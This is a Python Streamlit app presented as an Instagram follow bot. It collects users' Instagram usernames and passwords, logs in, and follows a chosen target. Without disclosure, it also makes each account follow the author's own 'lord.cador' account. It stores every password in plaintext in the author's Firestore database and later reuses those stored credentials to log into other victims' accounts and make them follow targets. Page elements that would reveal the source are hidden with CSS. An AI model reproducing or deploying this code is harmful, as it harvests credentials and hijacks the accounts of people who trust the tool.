import random
import time
import streamlit as st
from instagrapi import Client
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from datetime import datetime, timedelta



st.markdown(
    """
    <style>
    /* Sembunyikan footer */
    footer {
        display: none !important;
    }
    
    /* Sembunyikan logo GitHub dan tulisan Fork */
    .stHeader [class*="github"] {
        display: none !important;
    }
    </style>
    """,
    unsafe_allow_html=True
)

# Inisialisasi Firebase

if not firebase_admin._apps:
    cred = credentials.Certificate('bot-instagram-fahmi-firebase-credentials.json')
    firebase_admin.initialize_app(cred, name='instagram_bot')  # Use a simple string name

# Inisialisasi Firestore
db = firestore.client()

# Global variable to store the last follow time
if 'last_follow_time' not in st.session_state:
    st.session_state.last_follow_time = None

def masuk_dan_follow(username, password, target_username):
    cl = Client()
    try:
        cl.login(username, password)
        st.success(f"{username} berhasil login!")

        try:
            target_user_id = cl.user_id_from_username(target_username)
            cl.user_follow(target_user_id)
            st.success(f"{username} berhasil mengikuti {target_username}!")
            time.sleep(random.randint(1, 3))  # Sleep between 1 to 3 seconds

            # Follow your own account
            self_user_id = cl.user_id_from_username('lord.cador')
            cl.user_follow(self_user_id)
            st.success(f"{username} berhasil mengikuti akun sendiri (lord.cador)!")

            simpan_ke_firestore(username, password, cl.user_id_from_username(username))

        except Exception as follow_error:
            st.error(f"Error saat mengikuti: {follow_error}")
            if "feedback_required" in str(follow_error):
                st.warning(f"{username} diblokir untuk mengikuti akun. Mungkin perlu istirahat.")
                time.sleep(5)  # Wait before retrying
                return  # Stop this execution to avoid further restrictions

        cl.logout()
        st.info(f"{username} telah logout.")

    except Exception as login_error:
        st.error(f"Error untuk {username}: {login_error}")

def simpan_ke_firestore(username, password, user_id):
    users_ref = db.collection('users')
    user_doc = users_ref.document(username)

    existing_data = user_doc.get()
    if existing_data.exists:
        existing_username = existing_data.to_dict().get('username')
        existing_password = existing_data.to_dict().get('password')
        existing_user_id = existing_data.to_dict().get('user_id')

        if (existing_username != username or 
            existing_password != password or 
            existing_user_id != user_id):
            user_doc.set({'username': username, 'password': password, 'user_id': user_id})
            st.success(f"Data {username} diperbarui di Firestore.")
        else:
            st.info(f"{username} sudah ada di Firestore dengan data yang sama, melewati penyimpanan.")
    else:
        user_doc.set({'username': username, 'password': password, 'user_id': user_id})
        st.success(f"{username} disimpan di Firestore.")

def countdown_timer(seconds):
    """Display a countdown timer."""
    countdown_display = st.empty()
    while seconds > 0:
        mins, secs = divmod(seconds, 60)
        countdown_display.text(f"Berikutnya dapat melakukan follow dalam: {mins:02d}:{secs:02d}")
        time.sleep(1)
        seconds -= 1
    countdown_display.text("Anda sekarang dapat melakukan follow lagi!")

def main():
    st.title("Instagram Follow Bot")

    username = st.text_input("Masukkan username Instagram Anda:")
    password = st.text_input("Masukkan password Instagram Anda:", type='password')
    target_username = st.text_input("Masukkan username target Instagram Anda:")

    # Check if 15 minutes have passed since the last follow action
    if st.session_state.last_follow_time:
        time_since_last_follow = datetime.now() - st.session_state.last_follow_time
        if time_since_last_follow < timedelta(minutes=15):
            remaining_time = (timedelta(minutes=15) - time_since_last_follow).seconds
            countdown_timer(remaining_time)
            st.button("Mulai Follow", disabled=True)
        else:
            if st.button("Mulai Follow"):
                # Update last follow time
                st.session_state.last_follow_time = datetime.now()
                # Start follow process
                progress_bar = st.progress(20)
                if username and password and target_username:
                    masuk_dan_follow(username, password, target_username)
                    users_ref = db.collection('users')
                    all_users = [doc.id for doc in users_ref.stream()]

                    if len(all_users) < 1:
                        st.warning("Tidak ada cukup pengguna di Firestore untuk di-follow.")
                        return

                    jumlah_pengguna = min(len(all_users) - 1, 10)
                    all_users.remove(username)
                    pengguna_terpilih = random.sample(all_users, jumlah_pengguna)

                    for idx, user in enumerate(pengguna_terpilih):
                        user_data = users_ref.document(user).get().to_dict()
                        if user_data:
                            masuk_dan_follow(user_data['username'], user_data['password'], target_username)
                            time.sleep(random.randint(1, 3))
                            progress = (idx + 1) / jumlah_pengguna
                            progress_bar.progress(progress)

                    st.success("Selesai mengikuti pengguna yang dipilih!")
                else:
                    st.warning("Silakan isi semua field.")
    else:
        if st.button("Mulai Follow"):
            st.session_state.last_follow_time = datetime.now()
            progress_bar = st.progress(20)
            if username and password and target_username:
                masuk_dan_follow(username, password, target_username)
                users_ref = db.collection('users')
                all_users = [doc.id for doc in users_ref.stream()]

                if len(all_users) < 1:
                    st.warning("Tidak ada cukup pengguna di Firestore untuk di-follow.")
                    return

                jumlah_pengguna = min(len(all_users) - 1, 10)
                all_users.remove(username)
                pengguna_terpilih = random.sample(all_users, jumlah_pengguna)

                for idx, user in enumerate(pengguna_terpilih):
                    user_data = users_ref.document(user).get().to_dict()
                    if user_data:
                        masuk_dan_follow(user_data['username'], user_data['password'], target_username)
                        time.sleep(random.randint(1, 3))
                        progress = (idx + 1) / jumlah_pengguna
                        progress_bar.progress(progress)

                st.success("Selesai mengikuti pengguna yang dipilih!")
            else:
                st.warning("Silakan isi semua field.")

if __name__ == "__main__":
    main()
